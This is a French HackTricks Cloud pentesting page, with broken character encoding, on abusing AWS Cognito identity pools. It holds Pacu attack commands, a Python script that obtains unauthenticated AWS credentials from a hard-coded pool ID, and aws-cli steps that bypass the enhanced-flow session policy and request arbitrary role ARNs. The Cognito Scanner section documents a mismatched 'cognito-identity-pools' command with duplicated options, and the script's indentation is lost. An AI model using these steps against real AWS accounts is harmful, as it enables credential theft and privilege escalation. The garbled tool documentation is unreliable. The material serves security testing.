# Pools d'identit√©s Cognito

<details>

<summary><strong>Soutenez HackTricks et b√©n√©ficiez d'avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous souhaitez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez** üí¨ [**le groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Informations de base

Avec un pool d'identit√©s, vos utilisateurs peuvent **obtenir des informations d'identification AWS temporaires pour acc√©der aux services AWS**, tels que Amazon S3 et DynamoDB. Les pools d'identit√©s prennent en charge les utilisateurs invit√©s anonymes, ainsi que les fournisseurs d'identit√© suivants que vous pouvez utiliser pour authentifier les utilisateurs pour les pools d'identit√©s :

* Pools d'utilisateurs Amazon Cognito
* Connexion sociale avec Facebook, Google, Connexion avec Amazon et Connexion avec Apple
* OpenID Connect (OIDC) providers
* Fournisseurs d'identit√© SAML
* Identit√©s authentifi√©es par le d√©veloppeur

### Cognito Sync

Pour g√©n√©rer des sessions de pool d'identit√©s, vous devez d'abord **g√©n√©rer un ID d'identit√©**. Cet ID d'identit√© est l'**identification de la session de cet utilisateur**. Ces identifications peuvent comporter jusqu'√† 20 ensembles de donn√©es pouvant stocker jusqu'√† 1 Mo de paires cl√©-valeur.

Cela est **utile pour conserver les informations d'un utilisateur** (qui utilisera toujours le m√™me ID d'identit√©).

De plus, le service **cognito-sync** est le service qui permet de **g√©rer et synchroniser ces informations** (dans les ensembles de donn√©es, en envoyant des informations dans des flux et des messages SNS...).

### Modules Pacu pour les tests de p√©n√©tration et l'√©num√©ration

[Pacu](https://github.com/RhinoSecurityLabs/pacu), le framework d'exploitation AWS, inclut d√©sormais les modules "cognito__enum" et "cognito__attack" qui automatisent l'√©num√©ration de tous les actifs Cognito dans un compte et signalent les configurations faibles, les attributs d'utilisateur utilis√©s pour le contr√¥le d'acc√®s, etc., et automatisent √©galement la cr√©ation d'utilisateurs (y compris la prise en charge de la MFA) et l'√©l√©vation des privil√®ges bas√©e sur des attributs personnalis√©s modifiables, des informations d'identification de pool d'identit√©s utilisables, des r√¥les assumables dans les jetons d'identit√©, etc.

Pour une description des fonctions des modules, consultez la partie 2 du [billet de blog](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2). Pour les instructions d'installation, consultez la page principale de [Pacu](https://github.com/RhinoSecurityLabs/pacu).

### Utilisation

Exemple d'utilisation de cognito__attack pour tenter la cr√©ation d'un utilisateur et toutes les vecteurs de privil√®ge contre un pool d'identit√©s donn√© et un client de pool d'utilisateurs :
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
Voici un exemple d'utilisation de cognito__enum pour collecter tous les pools d'utilisateurs, les clients de pool d'utilisateurs, les pools d'identit√©s, les utilisateurs, etc. visibles dans le compte AWS actuel :

```bash
cognito__enum --all
```

Cet exemple ex√©cute la commande cognito__enum avec l'option --all pour r√©cup√©rer toutes les informations disponibles sur les pools d'utilisateurs, les clients de pool d'utilisateurs, les pools d'identit√©s, les utilisateurs, etc. dans le compte AWS actuel.
```bash
Pacu (new:test) > run cognito__enum
```
### Outil pour le pentest

[Cognito Scanner](https://github.com/padok-team/cognito-scanner) est un outil en ligne de commande (CLI) en python qui met en ≈ìuvre diff√©rentes attaques sur Cognito, y compris la cr√©ation de comptes ind√©sirables et l'escalade de pool d'identit√©s.

#### Installation
```bash
$ pip install cognito-scanner
```
#### Utilisation

#### Syntax

```plaintext
cognito-identity-pools [options]
```

#### Options

```plaintext
  -h, --help            Afficher l'aide pour la commande cognito-identity-pools
  -p, --profile <profile>  Utiliser un profil AWS sp√©cifique
  -r, --region <region>  Utiliser une r√©gion AWS sp√©cifique
  -o, --output <output>  Format de sortie (json, table, csv)
  -f, --format <format>  Format de sortie (json, table, csv)
  -a, --all             R√©cup√©rer tous les pools d'identit√©s Cognito
  -i, --id <id>         R√©cup√©rer un pool d'identit√©s Cognito sp√©cifique par ID
  -n, --name <name>     R√©cup√©rer un pool d'identit√©s Cognito sp√©cifique par nom
  -u, --user-pool-id <user-pool-id>  R√©cup√©rer les pools d'identit√©s Cognito associ√©s √† un pool d'utilisateurs sp√©cifique
  -l, --list            Afficher la liste des pools d'identit√©s Cognito disponibles
```

#### Description

L'outil `cognito-identity-pools` permet de r√©cup√©rer des informations sur les pools d'identit√©s Cognito dans AWS. Il peut √™tre utilis√© pour afficher la liste des pools d'identit√©s Cognito disponibles, r√©cup√©rer tous les pools d'identit√©s Cognito, r√©cup√©rer un pool d'identit√©s Cognito sp√©cifique par ID ou par nom, ou r√©cup√©rer les pools d'identit√©s Cognito associ√©s √† un pool d'utilisateurs sp√©cifique.

#### Exemples

- Afficher la liste des pools d'identit√©s Cognito disponibles :

```plaintext
cognito-identity-pools --list
```

- R√©cup√©rer tous les pools d'identit√©s Cognito :

```plaintext
cognito-identity-pools --all
```

- R√©cup√©rer un pool d'identit√©s Cognito sp√©cifique par ID :

```plaintext
cognito-identity-pools --id <id>
```

- R√©cup√©rer un pool d'identit√©s Cognito sp√©cifique par nom :

```plaintext
cognito-identity-pools --name <name>
```

- R√©cup√©rer les pools d'identit√©s Cognito associ√©s √† un pool d'utilisateurs sp√©cifique :

```plaintext
cognito-identity-pools --user-pool-id <user-pool-id>
```
```bash
$ cognito-scanner --help
```
Pour plus d'informations, consultez https://github.com/padok-team/cognito-scanner

## Acc√®s aux r√¥les IAM

### Non authentifi√©

La seule chose dont un attaquant a besoin pour **obtenir des informations d'identification AWS** dans une application Cognito en tant qu'utilisateur non authentifi√© est l'**ID du pool d'identit√©s**, et cet **ID doit √™tre cod√© en dur** dans l'application web/mobile pour l'utiliser. Un ID ressemble √† ceci : `eu-west-1:098e5341-8364-038d-16de-1865e435da3b` (il n'est pas possible de le deviner par force brute).

{% hint style="success" %}
Le **r√¥le IAM Cognito non authentifi√© cr√©√© via est appel√©** par d√©faut `Cognito_<Nom du pool d'identit√©s>Unauth_Role`
{% endhint %}

Si vous trouvez un ID de pool d'identit√©s cod√© en dur et qu'il autorise les utilisateurs non authentifi√©s, vous pouvez obtenir des informations d'identification AWS avec :
```python
import requests

region = "us-east-1"
id_pool_id = 'eu-west-1:098e5341-8364-038d-16de-1865e435da3b'
url = f'https://cognito-identity.{region}.amazonaws.com/'
headers = {"X-Amz-Target": "AWSCognitoIdentityService.GetId", "Content-Type": "application/x-amz-json-1.1"}
params = {'IdentityPoolId': id_pool_id}

r = requests.post(url, json=params, headers=headers)
json_resp = r.json()

if not "IdentityId" in json_resp:
print(f"Not valid id: {id_pool_id}")
exit

IdentityId = r.json()["IdentityId"]

params = {'IdentityId': IdentityId}

headers["X-Amz-Target"] = "AWSCognitoIdentityService.GetCredentialsForIdentity"
r = requests.post(url, json=params, headers=headers)

print(r.json())
```
Ou vous pouvez utiliser les commandes **aws cli** suivantes :
```bash
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign
aws cognito-identity get-credentials-for-identity --identity-id <identity_id> --no-sign
```
{% hint style="warning" %}
Notez que par d√©faut, un utilisateur Cognito **non authentifi√© NE PEUT PAS avoir de permission, m√™me si elle lui a √©t√© attribu√©e via une politique**. V√©rifiez la section suivante.
{% endhint %}

### Flux d'authentification am√©lior√© par rapport au flux d'authentification de base

La section pr√©c√©dente a suivi le **flux d'authentification am√©lior√© par d√©faut**. Ce flux d√©finit une **politique de session restrictive** [**session policy**](../../aws-basic-information/#session-policies) pour la session du r√¥le IAM g√©n√©r√©e. Cette politique permettra uniquement √† la session d'**utiliser les services de cette liste** (m√™me si le r√¥le avait acc√®s √† d'autres services).

Cependant, il existe un moyen de contourner cela, si le **pool d'identit√©s a activ√© le "flux de base (classique)"**, l'utilisateur pourra obtenir une session en utilisant ce flux qui **n'aura pas cette politique de session restrictive**.

{% code overflow="wrap" %}
```bash
# Get auth ID
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign

# Get login token
aws cognito-identity get-open-id-token --identity-id <identity_id> --no-sign

# Use login token to get IAM session creds
## If you don't know the role_arn use the previous enhanced flow to get it
aws sts assume-role-with-web-identity --role-arn "arn:aws:iam::<acc_id>:role/<role_name>" --role-session-name sessionname --web-identity-token <token> --no-sign
```
{% endcode %}

{% hint style="warning" %}
Si vous recevez cette **erreur**, c'est parce que le **flux de base n'est pas activ√© (par d√©faut)**

`Une erreur s'est produite (InvalidParameterException) lors de l'appel de l'op√©ration GetOpenIdToken : le flux de base (classique) n'est pas activ√©, veuillez utiliser le flux am√©lior√©.`
{% endhint %}

Avec un ensemble de **credentials IAM**, vous devriez v√©rifier [les acc√®s dont vous disposez](../../#whoami) et essayer de [les escalader](../../aws-privilege-escalation/).

### Authentifi√©

{% hint style="info" %}
N'oubliez pas que les **utilisateurs authentifi√©s** se verront probablement accorder des **permissions diff√©rentes**, donc si vous pouvez **vous inscrire dans l'application**, essayez de le faire et obtenez de nouvelles credentials.
{% endhint %}

Il peut √©galement y avoir des **r√¥les** disponibles pour les **utilisateurs authentifi√©s acc√©dant √† l'Identity Pool**.

Pour cela, vous devrez peut-√™tre avoir acc√®s au **fournisseur d'identit√©**. S'il s'agit d'un **Cognito User Pool**, vous pouvez peut-√™tre abuser du comportement par d√©faut et **cr√©er vous-m√™me un nouvel utilisateur**.

{% hint style="success" %}
Le **r√¥le IAM Cognito authentifi√© cr√©√© via est appel√©** par d√©faut `Cognito_<Nom de l'Identity Pool>Auth_Role`
{% endhint %}

Quoi qu'il en soit, l'**exemple suivant** suppose que vous √™tes d√©j√† connect√© √† un **Cognito User Pool** utilis√© pour acc√©der √† l'Identity Pool (n'oubliez pas que d'autres types de fournisseurs d'identit√© peuvent √©galement √™tre configur√©s).

<pre class="language-bash"><code class="lang-bash">aws cognito-identity get-id \
--identity-pool-id &#x3C;identity_pool_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>

# Obtenez l'identity_id √† partir de la r√©ponse de la commande pr√©c√©dente
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>


# Dans l'IdToken, vous pouvez trouver les r√¥les auxquels un utilisateur a acc√®s en raison des groupes de User Pool
# Utilisez --custom-role-arn pour obtenir des credentials pour un r√¥le sp√©cifique
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
<strong>    --custom-role-arn &#x3C;role_arn> \
</strong>    --logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>
</code></pre>

{% hint style="warning" %}
Il est possible de **configurer diff√©rents r√¥les IAM en fonction du fournisseur d'identit√©** avec lequel l'utilisateur se connecte ou m√™me simplement en fonction de l'utilisateur (en utilisant des claims). Par cons√©quent, si vous avez acc√®s √† diff√©rents utilisateurs via le m√™me ou diff√©rents fournisseurs, il peut √™tre **int√©ressant de vous connecter et d'acc√©der aux r√¥les IAM de chacun d'entre eux**.
{% endhint %}

<details>

<summary><strong>Soutenez HackTricks et b√©n√©ficiez d'avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous souhaitez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github repos**.

</details>
